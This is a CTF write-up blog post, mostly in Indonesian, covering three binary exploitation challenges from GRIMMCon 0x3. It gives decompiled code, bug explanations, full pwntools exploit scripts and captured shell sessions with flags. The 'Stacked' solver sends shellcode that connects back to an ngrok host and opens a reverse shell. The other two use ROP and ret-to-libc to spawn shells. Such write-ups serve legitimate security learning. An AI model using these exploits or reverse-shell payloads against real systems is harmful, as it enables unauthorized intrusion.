---
layout: post
title: "GRIMMCon 0x3 CTF - Binary Exploit"
date: 2020-12-31 12:45:45 +0530
categories:
  - WriteUp
  - PWN
---

![Banner Intro](https://raw.githubusercontent.com/abdullahnz/abdullahnz.github.io/master/_posts/images/grimmcon/intro.png)

## Stacked [489 pts]

Use `jmp rsp` gadged to return in our shellcode.

### Overview

main func.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax@17
  int optval; // [sp+1Ch] [bp-44h]@7
  struct sockaddr addr; // [sp+20h] [bp-40h]@17
  __int16 s; // [sp+30h] [bp-30h]@10
  uint16_t v7; // [sp+32h] [bp-2Eh]@10
  uint32_t v8; // [sp+34h] [bp-2Ch]@10
  socklen_t addr_len; // [sp+4Ch] [bp-14h]@16
  int v10; // [sp+50h] [bp-10h]@17
  int v11; // [sp+54h] [bp-Ch]@17
  int fd; // [sp+58h] [bp-8h]@4
  int v13; // [sp+5Ch] [bp-4h]@4

  if ( argc <= 1 )
  {
    fwrite("Not enough arguments.\n", 1uLL, 0x16uLL, _bss_start);
    fwrite("Usage: ./stacked [port]\n", 1uLL, 0x18uLL, _bss_start);
    exit(1);
  }
  v13 = atoi(argv[1]);
  fd = socket(2, 1, 0);
  if ( fd == -1 )
  {
    fwrite("Failed to create socket.\n", 1uLL, 0x19uLL, _bss_start);
    exit(1);
  }
  optval = 1;
  if ( setsockopt(fd, 1, 2, &optval, 4u) < 0 )
  {
    fwrite("Error setting socket options.\n", 1uLL, 0x1EuLL, _bss_start);
    exit(1);
  }
  bzero(&s, 0x10uLL);
  s = 2;
  v8 = htonl(0);
  v7 = htons(v13);
  if ( bind(fd, (const struct sockaddr *)&s, 0x10u) )
  {
    fwrite("Failed to bind socked.\n", 1uLL, 0x17uLL, _bss_start);
    exit(1);
  }
  if ( listen(fd, 5) )
  {
    fwrite("Failed to listen.\n", 1uLL, 0x12uLL, _bss_start);
    exit(1);
  }
  fprintf(_bss_start, "Listening on port %d...\n", (unsigned int)v13, argv);
  addr_len = 16;
  while ( 1 )
  {
    v11 = accept(fd, &addr, &addr_len);
    v3 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
    fprintf(_bss_start, "Received connection from: %s\n", v3);
    v10 = fork();
    if ( !v10 )
      break;
    close(v11);
  }
  handle_client(v11);
  close(v11);
  exit(0);
}
```

Fungsi main hanya melalukan listening ke localhost dengan port merupakan argument kedua dari user. Lalu, untuk interaksi diproses pada fungsi handle_client.

```c
ssize_t __fastcall handle_client(int a1)
{
  char buf; // [sp+10h] [bp-400h]@1

  send(a1, "Overflow me!\n", 0xDuLL, 0);
  send(a1, "> ", 2uLL, 0);
  return recv(a1, &buf, 0x800uLL, 0);
}
```

Bug-nya terlihat jelas pada *handle_client* dimana terdapat *buffer-overflow* yaitu karena user diberikan input sebesar 0x800, tetapi variable buf hanya berukuran 0x400.

### Exploit

Terdapat fungsi yang menarik disini, yaitu pada fungsi *useful*. Seperti namanya, fungsi ini sangat berguna.

```c
.text:0000000000401557 useful       proc near
.text:0000000000401557              jmp     rsp
.text:0000000000401557 useful       endp
```

Karena stack executable, bisa return ke shellcode kita dengan gadget diatas.

Oiya, karena interaksi dilakukan tidak langsung pada binarynya *child atau apalah ngga tau istilahnya*, jika inject shellcode *execve* secara langsung, maka stdin, stdout akan masuk *parent*-nya.

Solusi? *socketcall* syscall. Full solver.

```python
#!/usr/bin/python

from pwn import *

BINARY = './stacked'

elf = ELF(BINARY)
context.arch = 'amd64'

gdbscript = ''''''

def debug(gdbscript):
   if type(r) == process:
      gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
   p = 'a'*0x408
   p += p64(elf.sym['useful'])
   p += asm(shellcraft.connect('4.tcp.ngrok.io', 15625))
   p += asm(shellcraft.dup2("rbp", 0))
   p += asm(shellcraft.dup2("rbp", 1))
   p += asm(shellcraft.dup2("rbp", 2))
   p += asm(shellcraft.sh())
   
   r.sendlineafter("> ", p)

   r.interactive()

if __name__ == '__main__':
   if len(sys.argv) > 1:
      r = remote("challenge.ctf.games", sys.argv[1])
   else:
      r = process(ELF_PATH, aslr=0)
   exploit(r)
```

profit.

```python
$ nc -vlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from localhost 57362 received!
id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
ls -l 
total 24
-r--r--r-- 1 root root    39 Dec 29 15:37 flag.txt
---x--x--x 1 root root 17720 Dec 29 15:37 stacked
cat flag.txt
flag{e4fd4c9fcad9ba84666e5c7a4a9ab1f0}
```

### Flag

`flag{e4fd4c9fcad9ba84666e5c7a4a9ab1f0}`


## Patches Revenge [500pts]

Libc diberikan, berarti perlu *leak-meleak* disini.

### main_func

Hanya singkat, write dan read.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [sp+0h] [bp-200h]@1

  write(1, &unk_402004, 2uLL);
  read(0, &buf, 0x400uLL);
  return 0;
}
```

### information leak.

Ini binary 64bit. Parameter fungsi secara berurutan terletak di rdi, rsi, rdx, rcx, r8, r9, selebihnya di-*stack*.

Nah, gadget untuk mengeset rdi, rsi, dkk dalam binary ini tidak ditemukan. Sementara untuk melakukan leak dengan fungsi *write*, diperlukan 3 parameter (rdi, rsi, rdx). 

Solusi? yaa.. *ret-to-csu*. Kembali ke-*main* lagi untuk melakukan rop yang ke-dua.

Full solver,

```python
#!/usr/bin/python

from pwn import *

ELF_PATH = './patches'

elf  = ELF(ELF_PATH)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', 0)

gdbscript = '''
    b *0x00000000004011B5
'''


def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
    p = "a"*0x208
    p += p64(0x000000000040121A)
    p += p64(0x1) # rbx
    p += p64(0x2) # rbp
    p += p64(0x1) # r12
    p += p64(elf.got['read']) # r13
    p += p64(0x10) # r14
    p += p64(elf.got['write']-8) # r15
    p += p64(0x0000000000401200)
    p += p64(elf.sym['main'])*8

    debug(gdbscript)

    r.sendlineafter("> ", p)
    leak = u64(r.recv()[:8])
    libc.address = leak - libc.sym['read']

    info("leak 0x%x", leak)
    info("libc 0x%x", libc.address)

    p = "a"*0x208
    p += p64(libc.address + 0x0000000000026b72) # pop rdi ; ret
    p += p64(libc.search("/bin/sh").next())
    p += p64(libc.address + 0x0000000000026b73) #  ret
    p += p64(libc.sym['system'])

    r.sendlineafter("> ", p)

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        libc = ELF("./libc.so.6", 0)
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)
```

ret-to-libc for profil.

```python
$ python solver.py 31322
[*] '/home/abdullahnz/ctf/grimmcon/pwn/patches/patches'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.ctf.games on port 31322: Done
[*] leak 0x7fb3a62eb130
[*] libc 0x7fb3a61da000
[*] Switching to interactive mode
$ id
uid=1000(challenge) gid=1000 groups=1000
$ ls -l
total 48
drwxr-xr-x 1 root 0 12288 Dec 28 17:47 bin
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 dev
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 etc
-r--r--r-- 1 root 0    39 Dec 28 17:46 flag.txt
lrwxrwxrwx 1 root 0     7 Dec 28 17:46 lib -> usr/lib
lrwxrwxrwx 1 root 0     9 Dec 28 17:46 lib32 -> usr/lib32
lrwxrwxrwx 1 root 0     9 Dec 28 17:46 lib64 -> usr/lib64
lrwxrwxrwx 1 root 0    10 Dec 28 17:46 libx32 -> usr/libx32
---x--x--x 1 root 0 16856 Dec 28 17:46 patches_revenge
drwxr-xr-x 1 root 0  4096 Dec 28 17:46 usr
$ cat flag.txt
flag{499c6288c77f297f4fd87db8e442e3f0}
[*] Interrupted
[*] Closed connection to challenge.ctf.games port 31322
```

### Flag 

`flag{499c6288c77f297f4fd87db8e442e3f0}`


## Weird Cookie [500 pts]

### the main function

Custom canary, if we can leak that, we got 2 leaks. *saved_canary* first, then xor with 0x123456789ABCDEF1 for libc leak.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+0h] [bp-30h]@1
  unsigned __int64 v5; // [sp+28h] [bp-8h]@1

  setup(*(_QWORD *)&argc, argv, envp);
  v5 = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
  saved_canary = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
  memset(&s, 0, 0x28uLL);
  puts("Do you think you can overflow me?");
  read(0, &s, 0x40uLL);
  puts(&s);
  memset(&s, 0, 0x28uLL);
  puts("Are you sure you overflowed it right? Try again.");
  read(0, &s, 0x40uLL);
  if ( v5 != saved_canary )
  {
    puts("Nope. :(");
    exit(0);
  }
  return 0;
}
```

Oke, karena input pakai read. Read itu tidak mengakhiri buffer dengan *nullbyte*. Nah, jika buffer sampai saved_canary tidak mengandung *nullbyte*, maka, saved_canary akan ikut ter-*puts* bersamaan dengan input buffer kita.

Karena *puts* itu terminate dengan *nullbyte*.

```python
$ python -c 'print "a"*0x28' | ./weird_cookie

00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
00000020  61 61 61 61 61 61 61 61  0a b1 18 6d 87 29 34 12  |aaaaaaaa...m.)4.|
00000030  90 52 55 55 55 55                                 |.RUUUU|
[snip]
```

Seperti yang saya katakan diatas. Libc leak dapat didapatkan dengan xor saved_canary dengan 0x123456789ABCDEF1.

Karena overflow hanya 24 byte, dan 16 byte untuk canary dan padding. Jadi untuk rop sendiri itu hanya 8 byte. Jadi, ret-to-libc dengan system disini tidak bisa dilakukan. Karena harus set parameter dulu yang butuh minimal 24 bytes.

Nah, karena versi libc yang dipakai server itu 2.27. Spray one_gadget disini bisa dilakukan. Fyi, semenjak saya masuk di libc.2.31, one_gadget hook tidak bisa dilakukan :'(.

Full solver,

```python
#!/usr/bin/python

from pwn import *

ELF_PATH = './weird_cookie'

elf  = ELF(ELF_PATH, 0)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so', 0)

gdbscript = ''''''

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
    p = "a"*0x28
    r.sendafter("?\n", p)
    
    canary = u64(r.recvline(0)[0x28:0x30])
    printf = canary ^ 0x123456789ABCDEF1
    libc.address = printf - libc.sym['printf']

    info("leak 0x%x", printf)
    info("libc 0x%x", libc.address)

    p += p64(canary)
    p += p64(canary)
    p += p64(libc.address + 0x4f432) # one_gadget

    r.sendafter(".\n", p)
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)
```

Run and got the flag~.

```python
$ python solver.py 30824
[+] Opening connection to challenge.ctf.games on port 30824: Done
[*] leak 0x7fec3b993f70
[*] libc 0x7fec3b92f000
[*] Switching to interactive mode
$ ls -l
total 48
drwxr-xr-x 1 root 0  4096 Dec 28 19:26 bin
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 dev
drwxr-xr-x 1 root 0  4096 Dec 28 19:26 etc
-r--r--r-- 1 root 0    39 Dec 28 19:25 flag.txt
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 lib
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 lib64
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 usr
---x--x--x 1 root 0 17000 Dec 28 19:25 weird_cookie
$ cat flag.txt
flag{e87923d7cd36a8580d0cf78656d457c6}
```

### Flag

flag{e87923d7cd36a8580d0cf78656d457c6}
